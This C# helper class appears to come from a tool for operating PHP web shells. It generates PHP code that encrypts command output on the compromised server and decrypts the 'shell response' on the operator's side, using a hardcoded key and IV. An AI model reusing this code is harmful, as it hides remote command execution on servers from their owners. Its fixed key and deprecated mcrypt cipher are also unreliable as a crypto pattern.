using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace bantam_php
{
    class EncryptionHelper
    {
        /// <summary>
        /// 
        /// </summary>
        public static readonly string g_EncryptionIV = "81278533799109198620954409981093";

        /// <summary>
        /// 
        /// </summary>
        public static readonly string g_EncryptionKey = "anjueolkdiwpoida";

        /// <summary>
        /// todo possibly kill  the encrytion if empty result
        /// </summary>
        /// <returns></returns>
        public static string encryptPhpResult()
        {
            string encryption = @"$iv = '" + g_EncryptionIV + "';" +
                "$key = '" + g_EncryptionKey + "';" +
                "$block = mcrypt_get_block_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC);" +
                "$result = base64_encode($result);" +
                "$padding = $block - (strlen($result) % $block);" +
                "$result.= str_repeat(chr($padding), $padding);" +
                "$crypttext = mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $result, MCRYPT_MODE_CBC, $iv);" +
                "echo base64_encode($crypttext);";
            return encryption;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="str"></param>
        /// <returns></returns>
        public static byte[] DecodeBase64(string str)
        {
            if (string.IsNullOrEmpty(str)) {
                return null;
            }

            string cleanB64 = Regex.Replace(str, "[^a-zA-Z0-9+=/]", "");
            var decbuff = Convert.FromBase64String(cleanB64);
            return decbuff;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="response"></param>
        /// <returns></returns>
        static public string DecryptShellResponse(string response)
        {
            if (string.IsNullOrEmpty(response)) {
                return string.Empty;
            }

            var encryptedResult = DecodeBase64(response);
            var decryptedResult = DecryptRJ256(encryptedResult, g_EncryptionKey, g_EncryptionIV);

            if (string.IsNullOrEmpty(decryptedResult)) {
                return string.Empty;
            }

            var finalResult = DecodeBase64(decryptedResult);
            string resultString = System.Text.Encoding.UTF8.GetString(finalResult, 0, finalResult.Length);
            return resultString;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="cypher"></param>
        /// <param name="KeyString"></param>
        /// <param name="IVString"></param>
        /// <returns></returns>
        static public String DecryptRJ256(byte[] cypher, string KeyString, string IVString)
        {
            var sRet = "";
            var encoding = new UTF8Encoding();
            var Key = encoding.GetBytes(KeyString);
            var IV = encoding.GetBytes(IVString);

            using (var rj = new RijndaelManaged()) {
                try {
                    rj.Padding = PaddingMode.PKCS7;
                    rj.Mode = CipherMode.CBC;
                    rj.KeySize = 256;
                    rj.BlockSize = 256;
                    rj.Key = Key;
                    rj.IV = IV;
                    var ms = new MemoryStream(cypher);
                    using (var cs = new CryptoStream(ms, rj.CreateDecryptor(Key, IV), CryptoStreamMode.Read)) {
                        using (var sr = new StreamReader(cs)) {
                            sRet = sr.ReadLine();
                        }
                    }
                } finally {
                    rj.Clear();
                }
            }
            return sRet;
        }
    }
}
